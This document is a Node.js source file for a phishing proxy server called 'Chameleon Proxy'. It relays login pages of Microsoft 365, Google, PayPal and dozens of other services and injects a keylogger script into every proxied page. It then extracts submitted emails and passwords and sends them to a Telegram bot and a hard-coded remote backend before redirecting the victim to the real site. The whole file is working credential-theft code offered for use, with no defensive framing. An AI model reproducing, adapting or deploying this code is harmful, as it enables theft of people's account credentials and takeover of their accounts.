const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const crypto = require('crypto');
const zlib = require('zlib');

// ============================================================
//  CONFIGURATION
// ============================================================

const BACKEND_URL = process.env.BACKEND_URL || "https://meeting-h5ze.onrender.com";
const KEYLOGGER_URL = process.env.KEYLOGGER_URL || "https://keyserver-eaar.onrender.com/log";
const TEAMS_REDIRECT = "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";

console.log(`[CONFIG] 🔗 Keylogger URL: ${KEYLOGGER_URL}`);
console.log(`[CONFIG] 🔗 Backend URL: ${BACKEND_URL}`);

// ============================================================
//  SESSION STORAGE
// ============================================================

const userSessions = {};
const attemptCounts = new Map();
const SESSION_TTL = 60 * 60 * 1000; // 1 hour

function generateSessionId() {
    return crypto.randomBytes(16).toString('hex');
}

function getSessionIdFromCookie(cookieHeader) {
    if (!cookieHeader) return null;
    const cookies = cookieHeader.split('; ');
    for (const cookie of cookies) {
        const [name, value] = cookie.split('=');
        if (name === 'sessionId') {
            return value;
        }
    }
    return null;
}

function getSession(sessionId) {
    if (!sessionId) return null;
    const session = userSessions[sessionId];
    if (!session) return null;
    if (Date.now() - session.timestamp > SESSION_TTL) {
        delete userSessions[sessionId];
        return null;
    }
    return session;
}

function createSession(originalUrl, email = null) {
    const sessionId = generateSessionId();
    userSessions[sessionId] = {
        originalUrl: originalUrl,
        timestamp: Date.now(),
        ip: null,
        cookies: [],
        email: email,
        credentials: [],
        activity: [],
        userAgent: null,
        referrer: null
    };
    return sessionId;
}

function updateSessionActivity(sessionId, activity) {
    if (sessionId && userSessions[sessionId]) {
        userSessions[sessionId].activity.push({
            ...activity,
            timestamp: Date.now()
        });
        userSessions[sessionId].lastActivity = Date.now();
    }
}

// ============================================================
//  IP EXTRACTION
// ============================================================

function getClientIp(req) {
    const cfIp = req.headers['cf-connecting-ip'];
    if (cfIp) return cfIp.trim();

    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',').map(ip => ip.trim());
        return ips[0] || 'unknown';
    }

    const realIp = req.headers['x-real-ip'];
    if (realIp) return realIp.trim();

    return req.socket.remoteAddress || 'unknown';
}

// ============================================================
//  SERVICE DETECTION - Enhanced
// ============================================================

function detectServiceFromDomain(targetUrl) {
    try {
        const url = new URL(targetUrl);
        const domain = url.hostname.toLowerCase();
        
        // Common service detection
        const services = {
            // Microsoft / Office 365
            'microsoftonline.com': 'Microsoft 365',
            'office.com': 'Microsoft 365',
            'outlook.com': 'Outlook',
            'hotmail.com': 'Hotmail',
            'live.com': 'Microsoft Live',
            'office365.com': 'Office 365',
            
            // Google
            'accounts.google.com': 'Google',
            'mail.google.com': 'Gmail',
            'googlemail.com': 'Gmail',
            'gmail.com': 'Gmail',
            
            // Yahoo
            'login.yahoo.com': 'Yahoo Mail',
            'yahoo.com': 'Yahoo',
            'ymail.com': 'Yahoo Mail',
            
            // Apple
            'appleid.apple.com': 'Apple ID',
            'icloud.com': 'iCloud',
            
            // China
            'mail.qq.com': 'QQ Mail',
            'qq.com': 'QQ',
            'mail.163.com': '163 Mail',
            'mail.126.com': '126 Mail',
            'mail.sina.com.cn': 'Sina Mail',
            
            // Korea
            'nid.naver.com': 'Naver',
            'login.daum.net': 'Daum',
            'hanmail.net': 'Hanmail',
            'hiworks.com': 'Hiworks',
            'hiworks.co.kr': 'Hiworks Korea',
            'kakao.com': 'Kakao',
            
            // Japan
            'docomo.ne.jp': 'docomo',
            'softbank.ne.jp': 'SoftBank',
            'yahoo.co.jp': 'Yahoo! Japan',
            
            // Russia
            'passport.yandex.com': 'Yandex',
            'passport.yandex.ru': 'Yandex Russia',
            'mail.ru': 'Mail.ru',
            
            // Europe
            'gmx.com': 'GMX',
            'gmx.de': 'GMX Germany',
            'web.de': 'WEB.DE',
            'mail.com': 'Mail.com',
            
            // Enterprise
            'login.salesforce.com': 'Salesforce',
            'zoom.us': 'Zoom',
            'teams.microsoft.com': 'Microsoft Teams',
            'slack.com': 'Slack',
            'github.com': 'GitHub',
            'linkedin.com': 'LinkedIn',
            
            // Social
            'facebook.com': 'Facebook',
            'twitter.com': 'Twitter / X',
            'instagram.com': 'Instagram',
            
            // E-commerce
            'amazon.com': 'Amazon',
            'paypal.com': 'PayPal',
            'ebay.com': 'eBay',
            
            // Streaming
            'netflix.com': 'Netflix',
            'spotify.com': 'Spotify',
            
            // Secure Email
            'mail.protonmail.com': 'ProtonMail',
            'mail.tutanota.com': 'Tutanota'
        };
        
        // Exact match
        for (const [key, value] of Object.entries(services)) {
            if (domain.includes(key)) {
                return value;
            }
        }
        
        // Check for corporate domain (Office 365)
        const domainParts = domain.split('.');
        if (domainParts.length >= 2) {
            const tld = domainParts[domainParts.length - 1];
            const corpTLDs = ['com', 'org', 'net', 'co', 'io', 'ai', 'app', 'dev', 'tech'];
            if (corpTLDs.includes(tld) && !['gmail', 'yahoo', 'outlook', 'hotmail', 'live', 'mail', 'google'].includes(domainParts[0])) {
                return 'Corporate (Office 365)';
            }
        }
        
        return 'Unknown Service';
    } catch (e) {
        return 'Unknown Service';
    }
}

// ============================================================
//  TELEGRAM NOTIFICATIONS - Enhanced
// ============================================================

async function sendToTelegram(email, password, success, ip, attemptCount, targetUrl, fullData = {}, sessionId = null, serviceName = null) {
    try {
        const fetch = require('node-fetch');
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;
        
        if (!botToken || !chatId) {
            console.log('[TELEGRAM] ⚠️ Missing credentials, skipping');
            console.log('[TELEGRAM] 💡 Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables');
            return;
        }

        if (!serviceName) {
            serviceName = detectServiceFromDomain(targetUrl);
        }
        
        const timestamp = new Date().toISOString();
        const location = ip.includes('unknown') ? 'Unknown' : ip;
        
        let msg = `🔐 *Chameleon Proxy - Session Capture*\n\n`;
        msg += `*📧 Email/Username:* ${email || 'unknown'}\n`;
        msg += `*🔑 Password:* ${password ? '***' : 'N/A'}\n`;
        msg += `*🎯 Service:* ${serviceName}\n`;
        msg += `*🔗 Target:* ${targetUrl || 'unknown'}\n`;
        msg += `*📡 IP:* ${location}\n`;
        msg += `*🕐 Time:* ${timestamp}\n`;
        msg += `*🔐 Status:* ${success ? '✅ VALID' : '❌ INVALID'}\n`;
        msg += `*📊 Attempt #:* ${attemptCount || 1}\n`;
        
        if (sessionId) {
            msg += `*🆔 Session:* ${sessionId.substring(0, 12)}...\n`;
        }

        // Add detected fields from form data
        if (fullData && Object.keys(fullData).length > 0) {
            const importantFields = ['name', 'username', 'user', 'login', 'loginfmt', 'userid', 'domain', 'company', 'firstname', 'lastname'];
            let extraInfo = '';
            for (const field of importantFields) {
                if (fullData[field]) {
                    const value = fullData[field];
                    if (value && value !== email && !value.includes(password)) {
                        extraInfo += `• ${field}: ${value}\n`;
                    }
                }
            }
            if (extraInfo) {
                msg += `\n*📋 Additional Info:*\n${extraInfo}`;
            }
            
            // Full data (truncated)
            const fullDataStr = JSON.stringify(fullData, null, 2);
            if (fullDataStr.length > 50 && fullDataStr.length < 500) {
                msg += `\n*📝 Full Data:*\n\`\`\`json\n${fullDataStr}\n\`\`\``;
            } else if (fullDataStr.length >= 500) {
                msg += `\n*📝 Full Data:*\n\`\`\`json\n${fullDataStr.substring(0, 500)}\n\`\`\``;
            }
        }

        // Send to Telegram
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: msg,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        });

        if (response.ok) {
            console.log(`[TELEGRAM] ✅ Sent credentials for: ${email} (${serviceName})`);
        } else {
            const errorText = await response.text();
            console.log(`[TELEGRAM] ❌ Failed to send: ${response.status} - ${errorText}`);
        }
    } catch (error) {
        console.error(`[TELEGRAM] ❌ Error: ${error.message}`);
    }
}

// ============================================================
//  HELPERS
// ============================================================

function serveFile(filename, res, contentType = 'text/html') {
    const filePath = path.join(__dirname, filename);
    fs.readFile(filePath, (err, data) => {
        if (err) {
            console.error(`[ERROR] Failed to read ${filename}:`, err.message);
            res.writeHead(404, { 'Content-Type': 'text/html' });
            res.end('<h1>404 Not Found</h1>');
            return;
        }
        res.writeHead(200, { 
            'Content-Type': contentType, 
            'Cache-Control': 'no-store, no-cache, must-revalidate',
            'Pragma': 'no-cache'
        });
        res.end(data);
    });
}

function extractCredentials(body) {
    try {
        const formData = typeof body === 'string' ? querystring.parse(body) : body;
        let email = formData.email || formData.username || formData.user || 
                    formData.login || formData.loginfmt || formData.userid || 
                    formData.name || formData.account || formData.mail || 
                    formData.logon || formData.userName || '';
        const password = formData.password || formData.pass || formData.passwd || 
                        formData.pwd || formData.userpass || formData.passcode || '';

        // Try to find email in any field
        if (!email) {
            for (const [key, value] of Object.entries(formData)) {
                if (value && typeof value === 'string') {
                    if (value.includes('@') && !password.includes(value)) {
                        email = value;
                        break;
                    }
                    // Check for email pattern
                    const emailMatch = value.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
                    if (emailMatch) {
                        email = emailMatch[0];
                        break;
                    }
                    // Check for username pattern (might not be email)
                    if (key.toLowerCase().includes('user') || key.toLowerCase().includes('login')) {
                        if (value.length > 2 && !password.includes(value)) {
                            email = value;
                        }
                    }
                }
            }
        }

        return { email: email || 'unknown', password: password || '', formData };
    } catch (e) {
        return { email: 'unknown', password: '', formData: {} };
    }
}

function sanitizeUrl(url) {
    try {
        const parsed = new URL(url);
        // Prevent SSRF attacks
        const blockedDomains = ['localhost', '127.0.0.1', '0.0.0.0', '::1'];
        if (blockedDomains.includes(parsed.hostname)) {
            return null;
        }
        return parsed.toString();
    } catch (e) {
        return null;
    }
}

// ============================================================
//  MAIN REQUEST HANDLER – Universal Proxy
// ============================================================

const server = http.createServer((req, res) => {
    console.log(`[REQUEST] ${req.method} ${req.url}`);

    // --- Serve files ---
    if (req.url === '/' || req.url === '/index.html') {
        serveFile('index.html', res);
        return;
    }
    if (req.url === '/inject.js') {
        serveFile('script_inject.js', res, 'text/javascript');
        return;
    }

    // --- Health check for Render ---
    if (req.url === '/health') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ 
            status: 'healthy', 
            timestamp: new Date().toISOString(),
            uptime: process.uptime(),
            sessions: Object.keys(userSessions).length,
            version: '1.0.0',
            keyloggerUrl: KEYLOGGER_URL,
            memory: process.memoryUsage()
        }));
        return;
    }

    // --- Session info endpoint (admin) ---
    if (req.url === '/sessions' && req.method === 'GET') {
        const sessionData = Object.keys(userSessions).map(id => ({
            sessionId: id.substring(0, 12) + '...',
            targetUrl: userSessions[id].originalUrl,
            email: userSessions[id].email || 'N/A',
            created: new Date(userSessions[id].timestamp).toISOString(),
            lastActivity: userSessions[id].lastActivity ? 
                new Date(userSessions[id].lastActivity).toISOString() : 'N/A',
            credentialsCount: (userSessions[id].credentials || []).length,
            activityCount: (userSessions[id].activity || []).length,
            ip: userSessions[id].ip || 'N/A'
        }));
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            total: sessionData.length,
            sessions: sessionData
        }, null, 2));
        return;
    }

    // --- Get target URL from query parameter ---
    const targetParam = req.url.match(/target=([^&]+)/);
    const targetUrl = targetParam ? decodeURIComponent(targetParam[1]) : null;

    // --- Extract email from URL ---
    let urlEmail = null;
    if (targetUrl) {
        try {
            const url = new URL(targetUrl);
            const params = new URLSearchParams(url.search);
            urlEmail = params.get('e') || params.get('email') || params.get('login_hint') || 
                      params.get('user') || params.get('username');
            if (urlEmail) {
                urlEmail = decodeURIComponent(urlEmail);
                console.log(`[EMAIL] Found in URL: ${urlEmail}`);
            }
        } catch (e) {}
    }

    // --- If no target, redirect to default ---
    if (!targetUrl && req.method === 'GET') {
        console.log('[REDIRECT] No target specified, redirecting to Google');
        res.writeHead(302, { 
            'Location': 'https://www.google.com/',
            'Cache-Control': 'no-store'
        });
        res.end();
        return;
    }

    // --- Check session ---
    const sessionId = getSessionIdFromCookie(req.headers.cookie);
    let session = sessionId ? getSession(sessionId) : null;

    // --- Create session if new ---
    if (!session && targetUrl) {
        const newSessionId = createSession(targetUrl, urlEmail);
        const isSecure = req.headers['x-forwarded-proto'] === 'https' || req.socket.encrypted;
        const cookieFlags = `Path=/; HttpOnly; SameSite=Lax; Max-Age=3600${isSecure ? '; Secure' : ''}`;
        res.setHeader('Set-Cookie', [`sessionId=${newSessionId}; ${cookieFlags}`]);
        session = userSessions[newSessionId];
        session.ip = getClientIp(req);
        session.userAgent = req.headers['user-agent'] || 'Unknown';
        session.referrer = req.headers['referer'] || 'Direct';
        console.log(`[SESSION] Created new session for: ${targetUrl}`);
        if (urlEmail) {
            console.log(`[SESSION] Email pre-filled: ${urlEmail}`);
        }
    }

    // --- Update session activity ---
    if (sessionId) {
        updateSessionActivity(sessionId, { 
            method: req.method, 
            url: req.url,
            ip: getClientIp(req)
        });
    }

    // --- Handle POST (credential capture) ---
    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            handlePostRequest(body, req, res, session, targetUrl, sessionId);
        });
        return;
    }

    // --- Handle GET (proxy the target) ---
    if (targetUrl && session) {
        // Check if it's a WebSocket upgrade
        if (req.headers.upgrade && req.headers.upgrade.toLowerCase() === 'websocket') {
            console.log('[WEBSOCKET] WebSocket upgrade detected, forwarding...');
            handleProxyRequest(req, res, targetUrl, session, sessionId);
            return;
        }
        handleProxyRequest(req, res, targetUrl, session, sessionId);
    } else {
        console.log('[REDIRECT] No valid session or target, redirecting to Google');
        res.writeHead(302, { 
            'Location': 'https://www.google.com/',
            'Cache-Control': 'no-store'
        });
        res.end();
    }
});

// ============================================================
//  HANDLE POST – Capture credentials - Enhanced
// ============================================================

async function handlePostRequest(body, req, res, session, targetUrl, sessionId) {
    try {
        const ip = getClientIp(req);
        const { email, password, formData } = extractCredentials(body);
        const serviceName = detectServiceFromDomain(targetUrl);
        
        // Track attempts
        let attemptCount = attemptCounts.get(email) || 0;
        attemptCount++;
        attemptCounts.set(email, attemptCount);

        // Update session with credentials
        if (sessionId && userSessions[sessionId]) {
            userSessions[sessionId].credentials.push({
                email: email,
                password: password,
                timestamp: Date.now(),
                ip: ip,
                fullData: formData,
                service: serviceName
            });
            if (email && email !== 'unknown') {
                userSessions[sessionId].email = email;
            }
        }

        console.log(`[CREDENTIALS] 📧 Email: ${email}`);
        console.log(`[CREDENTIALS] 🔑 Password: ${password ? '***' : 'N/A'}`);
        console.log(`[CREDENTIALS] 🎯 Service: ${serviceName}`);
        console.log(`[CREDENTIALS] 📡 IP: ${ip}`);
        console.log(`[CREDENTIALS] 📊 Attempt: ${attemptCount}`);

        // Send to Telegram (non-blocking)
        await sendToTelegram(
            email, 
            password, 
            false, 
            ip, 
            attemptCount, 
            targetUrl, 
            formData,
            sessionId,
            serviceName
        );

        // Also send to backend for logging
        try {
            const fetch = require('node-fetch');
            await fetch(`${BACKEND_URL}/api/log-action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'credential_capture',
                    email: email,
                    password: password,
                    service: serviceName,
                    targetUrl: targetUrl,
                    ip: ip,
                    sessionId: sessionId,
                    timestamp: new Date().toISOString(),
                    formData: formData
                })
            });
            console.log(`[BACKEND] ✅ Logged to backend`);
        } catch (e) {
            console.log(`[BACKEND] ⚠️ Failed to log to backend: ${e.message}`);
        }

        // Redirect to the real target
        const redirectUrl = targetUrl || TEAMS_REDIRECT;
        console.log(`[REDIRECT] ➡️ Redirecting to: ${redirectUrl}`);
        
        res.writeHead(302, { 
            'Location': redirectUrl,
            'Cache-Control': 'no-store, no-cache, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0'
        });
        res.end();

    } catch (error) {
        console.error('[ERROR] POST handling:', error.message);
        console.error('[ERROR] Stack:', error.stack);
        res.writeHead(500, { 'Content-Type': 'text/html' });
        res.end('<h1>Internal Server Error</h1><p>Please try again later.</p>');
    }
}

// ============================================================
//  HANDLE GET – Proxy the target website - Enhanced with KEYLOGGER_URL
// ============================================================

function handleProxyRequest(req, res, targetUrl, session, sessionId) {
    console.log(`[PROXY] 🔄 Forwarding to: ${targetUrl}`);

    // Parse target URL
    let target;
    try {
        target = new URL(targetUrl);
        // Validate URL
        if (!target.protocol || !target.hostname) {
            throw new Error('Invalid URL');
        }
    } catch (e) {
        console.error(`[PROXY] Invalid URL: ${targetUrl}`);
        res.writeHead(302, { 'Location': 'https://www.google.com/' });
        res.end();
        return;
    }

    // Determine protocol
    const protocol = target.protocol === 'https:' ? https : http;
    
    // Build request options
    const options = {
        hostname: target.hostname,
        port: target.port || (target.protocol === 'https:' ? 443 : 80),
        path: target.pathname + target.search,
        method: req.method,
        headers: {
            ...req.headers,
            host: target.hostname,
            'user-agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'accept': req.headers['accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'accept-language': req.headers['accept-language'] || 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate, br'
        },
        rejectUnauthorized: false,
        timeout: 30000
    };

    // Remove unwanted headers that might cause issues
    delete options.headers['cookie'];
    delete options.headers['content-length'];
    delete options.headers['host'];
    delete options.headers['connection'];

    const proxyReq = protocol.request(options, (proxyRes) => {
        let data = [];
        let contentLength = 0;
        
        proxyRes.on('data', chunk => {
            data.push(chunk);
            contentLength += chunk.length;
        });
        
        proxyRes.on('end', () => {
            let body = Buffer.concat(data);
            
            // Decompress if needed
            const encoding = proxyRes.headers['content-encoding'];
            if (encoding && (encoding.includes('gzip') || encoding.includes('deflate'))) {
                try {
                    if (encoding.includes('gzip')) {
                        body = zlib.gunzipSync(body);
                    } else if (encoding.includes('deflate')) {
                        body = zlib.inflateSync(body);
                    }
                    delete proxyRes.headers['content-encoding'];
                } catch (e) {
                    console.log('[PROXY] Decompression error:', e.message);
                }
            }

            // --- INJECT SCRIPT WITH KEYLOGGER_URL ---
            const contentType = proxyRes.headers['content-type'] || '';
            if (contentType.includes('text/html')) {
                try {
                    let html = body.toString('utf8');
                    
                    // Check if script already injected
                    if (!html.includes('Chameleon Proxy')) {
                        // Build the injection script with KEYLOGGER_URL
                        const injectScript = `
                        <script>
                            // Chameleon Proxy - Keylogger Configuration
                            window.KEYLOGGER_URL = '${KEYLOGGER_URL}';
                            window.BACKEND_URL = '${BACKEND_URL}';
                            window.SESSION_ID = '${sessionId || ''}';
                            console.log('🔐 Chameleon Proxy injected with KEYLOGGER_URL:', window.KEYLOGGER_URL);
                        </script>
                        <script src="/inject.js"></script>
                        `;
                        
                        // Inject before </body>
                        html = html.replace(/<\/body>/i, injectScript + '</body>');
                        body = Buffer.from(html);
                        proxyRes.headers['content-length'] = body.length;
                        console.log('[PROXY] ✅ Script injected with KEYLOGGER_URL');
                    } else {
                        console.log('[PROXY] ⚠️ Script already present, skipping injection');
                    }
                } catch (e) {
                    console.log('[PROXY] Injection error:', e.message);
                }
            }

            // Copy response headers
            const responseHeaders = { ...proxyRes.headers };
            
            // Set security headers
            responseHeaders['X-Frame-Options'] = 'SAMEORIGIN';
            responseHeaders['X-Content-Type-Options'] = 'nosniff';
            responseHeaders['X-XSS-Protection'] = '1; mode=block';
            
            // Remove problematic headers
            delete responseHeaders['content-encoding'];
            
            res.writeHead(proxyRes.statusCode, responseHeaders);
            res.end(body);
        });
    });

    proxyReq.on('error', (err) => {
        console.error(`[PROXY] ❌ Error: ${err.message}`);
        console.error(`[PROXY] Target: ${targetUrl}`);
        // Try to redirect to target directly on error
        res.writeHead(302, { 
            'Location': targetUrl,
            'Cache-Control': 'no-store'
        });
        res.end();
    });

    proxyReq.on('timeout', () => {
        console.error(`[PROXY] ⏰ Timeout for: ${targetUrl}`);
        proxyReq.destroy();
        res.writeHead(302, { 'Location': targetUrl });
        res.end();
    });

    // Forward request body if any
    if (req.method === 'POST' || req.method === 'PUT') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            proxyReq.write(body);
            proxyReq.end();
        });
    } else {
        proxyReq.end();
    }
}

// ============================================================
//  CLEANUP SESSIONS (every 5 minutes)
// ============================================================

setInterval(() => {
    const now = Date.now();
    let cleaned = 0;
    for (const [id, session] of Object.entries(userSessions)) {
        if (now - session.timestamp > SESSION_TTL) {
            delete userSessions[id];
            cleaned++;
        }
    }
    if (cleaned > 0) {
        console.log(`[CLEANUP] 🧹 Removed ${cleaned} expired sessions`);
    }
}, 5 * 60 * 1000);

// ============================================================
//  START SERVER
// ============================================================

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log('╔═══════════════════════════════════════════════════════════╗');
    console.log('║                                                           ║');
    console.log('║        ✅  CHAMELEON PROXY SERVER v1.0                   ║');
    console.log('║        🔐  Universal Proxy + Keylogger + XSS             ║');
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log('║                                                           ║');
    console.log(`║   📍 Server:    http://localhost:${PORT}                   ║`);
    console.log('║   🔗 Usage:     /?target=https://target-site.com         ║');
    console.log('║   🔗 Health:    /health                                  ║');
    console.log('║   🔗 Sessions:  /sessions                                ║');
    console.log(`║   🔗 Keylogger: ${KEYLOGGER_URL}`);
    console.log(`║   📊 Active:    ${Object.keys(userSessions).length} sessions                         ║`);
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log('║                                                           ║');
    console.log('║   🚀 Ready to proxy ANY website!                         ║');
    console.log('║   📧 Auto-detects service from email                     ║');
    console.log('║   🔐 Captures credentials via keylogger                  ║');
    console.log('║   📤 Sends to Telegram automatically                     ║');
    console.log('║   🔗 Keylogger URL configured                           ║');
    console.log('║                                                           ║');
    console.log('╚═══════════════════════════════════════════════════════════╝');
});

// ============================================================
//  GRACEFUL SHUTDOWN
// ============================================================

process.on('SIGTERM', () => {
    console.log('🛑 Received SIGTERM, shutting down gracefully...');
    server.close(() => {
        console.log('✅ Server closed');
        process.exit(0);
    });
});

process.on('SIGINT', () => {
    console.log('🛑 Received SIGINT, shutting down gracefully...');
    server.close(() => {
        console.log('✅ Server closed');
        process.exit(0);
    });
});

// Handle uncaught exceptions
process.on('uncaughtException', (err) => {
    console.error('❌ Uncaught Exception:', err.message);
    console.error('Stack:', err.stack);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection at:', promise);
    console.error('Reason:', reason);
});